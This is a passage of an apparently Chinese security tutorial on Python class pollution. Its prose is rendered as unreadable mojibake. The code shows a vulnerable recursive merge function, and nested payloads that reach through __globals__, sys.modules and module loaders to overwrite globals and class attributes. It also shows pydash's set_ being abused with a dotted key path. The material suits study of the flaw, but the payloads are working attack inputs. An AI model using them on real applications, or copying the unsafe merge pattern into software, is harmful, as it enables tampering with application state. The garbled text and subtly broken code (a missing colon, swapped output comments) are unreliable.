</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test</span><span class="o">.</span><span class="vm">__globals__</span> <span class="o">==</span> <span class="nb">globals</span><span class="p">()</span> <span class="o">==</span> <span class="n">a</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#True</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>__globals__</code>æ¥è·å–åˆ°å…¨å±€å˜é‡ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹æ— ç»§æ‰¿å…³ç³»çš„ç±»å±æ€§ç”šè‡³å…¨å±€å˜é‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">secret_var</span> <span class="o">=</span> <span class="mi">114</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">a</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_class_var</span> <span class="o">=</span> <span class="s2">&#34;secret&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">b</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="n">b</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;secret_var&#34;</span> <span class="p">:</span> <span class="mi">514</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;a&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;secret_class_var&#34;</span> <span class="p">:</span> <span class="s2">&#34;Pooooluted ~&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#secret</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#114</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Pooooluted ~</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#514</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="å·²åŠ è½½æ¨¡å—è·å–">å·²åŠ è½½æ¨¡å—è·å–
</h3><p>å±€é™äºå½“å‰æ¨¡å—çš„å…¨å±€å˜é‡è·å–æ˜¾ç„¶ä¸å¤Ÿï¼Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦å¯¹å¹¶ä¸æ˜¯å®šä¹‰åœ¨å…¥å£æ–‡ä»¶ä¸­çš„ç±»å¯¹è±¡æˆ–è€…å±æ€§ï¼Œè€Œæˆ‘ä»¬çš„æ“ä½œä½ç½®åˆåœ¨å…¥å£æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å¯¹å…¶ä»–åŠ è½½è¿‡çš„æ¨¡å—æ¥è·å–äº†</p>
<h4 id="importåŠ è½½è·å–">importåŠ è½½è·å–
</h4><p>åœ¨åŠ è½½å…³ç³»ç®€å•çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»æ–‡ä»¶çš„<code>import</code>è¯­æ³•éƒ¨åˆ†æ‰¾åˆ°ç›®æ ‡æ¨¡å—ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è·å–å…¨å±€å˜é‡æ¥å¾—åˆ°ç›®æ ‡æ¨¡å—ï¼Œåœ¨payloadä¸­æˆ‘ä»¬åªéœ€è¦å¯¹å¯¹åº”çš„æ¨¡å—é‡æ–°å®šä½å°±å¯ä»¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#test.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">test_1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;test_1&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;secret_var&#34;</span> <span class="p">:</span> <span class="mi">514</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;target_class&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;secret_class_var&#34;</span> <span class="p">:</span> <span class="s2">&#34;Poluuuuuuted ~&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#secret</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">target_class</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#114</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#514</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">target_class</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Poluuuuuuted ~</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#test_1.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">secret_var</span> <span class="o">=</span> <span class="mi">114</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">target_class</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_class_var</span> <span class="o">=</span> <span class="s2">&#34;secret&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="sysæ¨¡å—åŠ è½½è·å–">sysæ¨¡å—åŠ è½½è·å–
</h4><p>åœ¨å¾ˆå¤šç¯å¢ƒå½“ä¸­ï¼Œä¼šå¼•ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—æˆ–è€…æ˜¯å†…ç½®æ¨¡å—ï¼Œè€Œä¸æ˜¯ç®€å•çš„importåŒçº§æ–‡ä»¶ä¸‹é¢çš„ç›®å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦å€ŸåŠ©sysæ¨¡å—ä¸­çš„moduleå±æ€§ï¼Œè¿™ä¸ªå±æ€§èƒ½å¤ŸåŠ è½½å‡ºæ¥åœ¨è‡ªè¿è¡Œå¼€å§‹æ‰€æœ‰å·²åŠ è½½çš„æ¨¡å—ï¼Œä»è€Œæˆ‘ä»¬èƒ½å¤Ÿä»å±æ€§ä¸­è·å–åˆ°æˆ‘ä»¬æƒ³è¦æ±¡æŸ“çš„ç›®æ ‡æ¨¡å—</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;sys&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;modules&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;test_1&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;secret_var&#34;</span> <span class="p">:</span> <span class="mi">514</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;target_class&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;secret_class_var&#34;</span> <span class="p">:</span> <span class="s2">&#34;Poluuuuuuted ~&#34;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å½“ç„¶æˆ‘ä»¬å»ä½¿ç”¨çš„<code>Payload</code>ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯ä¸ä¼šè¿™æ ·çš„ï¼Œå¦‚ä¸Šçš„<code>Payload</code>å®é™…ä¸Šæ˜¯åœ¨å·²ç»<code>import sys</code>çš„æƒ…å†µä¸‹ä½¿ç”¨çš„ï¼Œè€Œå¤§éƒ¨åˆ†æƒ…å†µæ˜¯æ²¡æœ‰ç›´æ¥å¯¼å…¥çš„ï¼Œè¿™æ ·é—®é¢˜å°±ä»<strong>å¯»æ‰¾<code>import</code>ç‰¹å®šæ¨¡å—çš„è¯­å¥</strong>è½¬æ¢ä¸º<strong>å¯»æ‰¾<code>import</code>äº†sysæ¨¡å—çš„è¯­å¥</strong>ï¼Œå¯¹é—®é¢˜è§£å†³çš„å¹¶ä¸è§å¾—æœ‰å¤šå°‘ä¼˜åŒ–</p>
<h4 id="åŠ è½½å™¨loaderè·å–">åŠ è½½å™¨loaderè·å–
</h4><p>ä¸ºäº†è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œè¿™é‡Œé‡‡ç”¨æ–¹å¼æ˜¯åˆ©ç”¨<code>Python</code>ä¸­åŠ è½½å™¨<code>loader</code>,ç®€å•æ¥è¯´å°±æ˜¯ä¸ºå®ç°æ¨¡å—åŠ è½½è€Œè®¾è®¡çš„ç±»ï¼Œå…¶åœ¨<code>importlib</code>è¿™ä¸€å†…ç½®æ¨¡å—ä¸­æœ‰å…·ä½“å®ç°ã€‚ä»¤äººåº†å¹¸çš„æ˜¯<code>importlib</code>æ¨¡å—ä¸‹æ‰€æœ‰çš„<code>py</code>æ–‡ä»¶ä¸­å‡å¼•å…¥äº†<code>sys</code>æ¨¡å—</p>
<p>è¿™æ ·æˆ‘ä»¬å’Œä¸Šé¢çš„sysæ¨¡å—è·å–å·²åŠ è½½æ¨¡å—å°±è”ç³»èµ·æ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±å˜æˆäº†åªè¦è·å–äº†åŠ è½½å™¨loaderï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>loader.__init__.__globals__['sys']</code>æ¥è·å–åˆ°sysæ¨¡å—ï¼Œç„¶åå†è·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„æ¨¡å—ã€‚</p>
<p>ç°åœ¨å°±æ˜¯è¦è·å–<code>loader</code></p>
<p><code>__loader__</code>å†…ç½®å±æ€§ä¼šè¢«èµ‹å€¼ä¸ºåŠ è½½è¯¥æ¨¡å—çš„<code>loader</code>ï¼Œè¿™æ ·åªè¦èƒ½è·å–åˆ°ä»»æ„çš„æ¨¡å—ä¾¿èƒ½é€šè¿‡<code>__loader__</code>å±æ€§è·å–åˆ°<code>loader</code>ï¼Œè€Œä¸”å¯¹äº<code>python3</code>æ¥è¯´é™¤äº†åœ¨<code>debug</code>æ¨¡å¼ä¸‹çš„ä¸»æ–‡ä»¶ä¸­<code>__loader__</code>ä¸º<code>None</code>ä»¥å¤–ï¼Œæ­£å¸¸æ‰§è¡Œçš„æƒ…å†µæ¯ä¸ªæ¨¡å—çš„<code>__loader__</code>å±æ€§å‡æœ‰ä¸€ä¸ªå¯¹åº”çš„ç±»</p>
<p>ä¸¾ä¸ªä¾‹å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–æ¨¡å—çš„loader</span>
</span></span><span class="line"><span class="cl"><span class="n">loader</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">__loader__</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ‰“å°loaderä¿¡æ¯</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">loader</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>__spec__</code>å†…ç½®å±æ€§åœ¨<code>Python 3.4</code>ç‰ˆæœ¬å¼•å…¥ï¼Œå…¶åŒ…å«äº†å…³äºç±»åŠ è½½æ—¶çš„ä¿¡æ¯ï¼Œæœ¬èº«æ˜¯å®šä¹‰åœ¨<code>Lib/importlib/_bootstrap.py</code>çš„ç±»<code>ModuleSpec</code>ï¼Œæ˜¾ç„¶å› ä¸ºå®šä¹‰åœ¨<code>importlib</code>æ¨¡å—ä¸‹çš„<code>py</code>æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡‡ç”¨<code>&lt;æ¨¡å—å&gt;.__spec__.__init__.__globals__['sys']</code>è·å–åˆ°<code>sys</code>æ¨¡å—</p>
<p>ç”±äº<code>ModuleSpec</code>çš„å±æ€§å€¼è®¾ç½®ï¼Œç›¸å¯¹äºä¸Šé¢çš„è·å–æ–¹å¼ï¼Œè¿˜æœ‰ä¸€ç§ç›¸å¯¹é•¿çš„<code>payload</code>çš„è·å–æ–¹å¼ï¼Œä¸»è¦æ˜¯åˆ©ç”¨<code>ModuleSpec</code>ä¸­çš„<code>loader</code>å±æ€§ã€‚å¦‚å±æ€§åæ‰€ç¤ºï¼Œè¯¥å±æ€§çš„å€¼æ˜¯æ¨¡å—åŠ è½½æ—¶æ‰€ç”¨çš„<code>loader</code></p>
<p>æ‰€ä»¥æœ‰è¿™æ ·çš„ç›¸å¯¹é•¿çš„<code>Payload</code>ï¼š<code>&lt;æ¨¡å—å&gt;.__spec__.loader.__init__.__globals__['sys']</code></p>
<h4 id="å®é™…ç¯å¢ƒä¸­çš„åˆå¹¶å‡½æ•°">å®é™…ç¯å¢ƒä¸­çš„åˆå¹¶å‡½æ•°
</h4><p>ç›®å‰å‘ç°äº†<code>Pydash</code>æ¨¡å—ä¸­çš„<code>set_</code>å’Œ<code>set_with</code>å‡½æ•°å…·æœ‰å¦‚ä¸Šå®ä¾‹ä¸­<code>merge</code>å‡½æ•°ç±»ä¼¼çš„ç±»å±æ€§èµ‹å€¼é€»è¾‘ï¼Œèƒ½å¤Ÿå®ç°æ±¡æŸ“æ”»å‡»ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pydash</span> <span class="kn">import</span> <span class="n">set_</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Father</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_value</span> <span class="o">=</span> <span class="s2">&#34;safe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollution</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pollutant</span> <span class="o">=</span> <span class="n">Pollution</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">father</span> <span class="o">=</span> <span class="n">Father</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;key&#34;</span> <span class="p">:</span> <span class="s2">&#34;__class__.__init__.__globals__.father.secret_value&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;value&#34;</span> <span class="p">:</span> <span class="s2">&#34;polluted&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="s2">&#34;key&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">value</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="s2">&#34;value&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="n">secret_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#safe</span>
</span></span><span class="line"><span class="cl"><span class="n">set_</span><span class="p">(</span><span class="n">pollutant</span><span class="p">,</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
